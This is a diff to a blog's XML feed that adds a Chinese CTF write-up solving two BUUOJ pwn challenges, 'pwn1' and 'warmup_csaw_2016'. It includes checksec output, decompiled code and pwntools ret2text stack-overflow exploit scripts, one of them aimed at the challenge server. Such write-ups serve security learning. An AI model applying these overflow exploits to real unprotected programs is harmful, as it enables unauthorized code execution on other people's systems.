@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Pwn练习-Day01</title>
+      <link href="/2020/03/13/ctf/pwn/day01/"/>
+      <url>/2020/03/13/ctf/pwn/day01/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>题目来源于 <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">https://buuoj.cn/challenges</a></p><p>按顺序做的，这两道题比较简单，就不做详细解析了，解法在我前几篇写的pwn基础中提到过都是ret2text的类型</p><h2 id="0x10-pwn1"><a href="#0x10-pwn1" class="headerlink" title="0x10 pwn1"></a>0x10 pwn1</h2><p>经典栈溢出</p><p>file</p><pre class=" language-lang-txt"><code class="language-lang-txt">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=1c72ddcad651c7f35bb655e0ddda5ecbf8d31999, not stripped</code></pre><p>64位文件 dynamically linked<br>动态链接库</p><p>checksec</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/pwn1/pwn1'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>无保护，且程序提供了system函数</p><p>ida 反汇编查看</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [sp+1h] [bp-Fh]@1  puts("please input");  gets(&s, argv);  puts(&s);  puts("ok,bye!!!");  return 0;}</code></pre><p>fun()</p><pre class=" language-lang-c"><code class="language-lang-c">int fun(){  return system("/bin/sh");}</code></pre><p>peda 算出offset为23</p><p>由此payload就明显了</p><pre class=" language-lang-txt"><code class="language-lang-txt">fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")fun_addr=0x401186payload=flat(['a'*23,p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><p>而这个exp在本地跑是没有什么问题的</p><p>nc 连上去就会超时，一会思考一下</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=process("./pwn1")pop_ret_addr=0x401185fun_addr=0x401186payload=flat(['a'*23,p64(pop_ret_addr),p64(fun_addr)])io.sendline(payload)io.interactive()</code></pre><h2 id="0x20-warmup-csaw-2016"><a href="#0x20-warmup-csaw-2016" class="headerlink" title="0x20 warmup_csaw_2016"></a>0x20 warmup_csaw_2016</h2><p>file:</p><pre class=" language-lang-txt"><code class="language-lang-txt">warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped</code></pre><p>64位动态链接库文件</p><p>checksec:</p><pre class=" language-lang-txt"><code class="language-lang-txt">[*] '/home/f0und/buuoj/pwn/warmup_csaw_2016/warmup_csaw_2016'    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments</code></pre><p>同样没得任何保护</p><p>ida 反汇编查看</p><pre class=" language-lang-txt"><code class="language-lang-txt">int __fastcall main(__int64 a1, char **a2, char **a3){  char s; // [sp+0h] [bp-80h]@1  char v5; // [sp+40h] [bp-40h]@1  write(1, "-Warm Up-\n", 0xAuLL);  write(1, "WOW:", 4uLL);  sprintf(&s, "%p\n", sub_40060D);  write(1, &s, 9uLL);  write(1, ">", 1uLL);  return gets(&v5, ">");}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">int sub_40060D(){  return system("cat flag.txt");}</code></pre><p>emmm，比上一题还简单</p><p>直接exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python#-*-coding:utf-8-*-from pwn import *context.log_level="debug"io=remote("node3.buuoj.cn",29722)#io=process("./warmup_csaw_2016")sys_addr=0x40060dpayload=flat(['a'*72,p64(sys_addr)])io.sendline(payload)io.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf </tag>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>命题及其联结词</title>
       <link href="/2020/02/26/math/lisan-1-1-md/"/>
       <url>/2020/02/26/math/lisan-1-1-md/</url>
@@ -286,9 +313,9 @@
       
         <tags>
             
-            <tag> ctf </tag>
-            
             <tag> swpuctf </tag>
+            
+            <tag> ctf </tag>
             
         </tags>
       
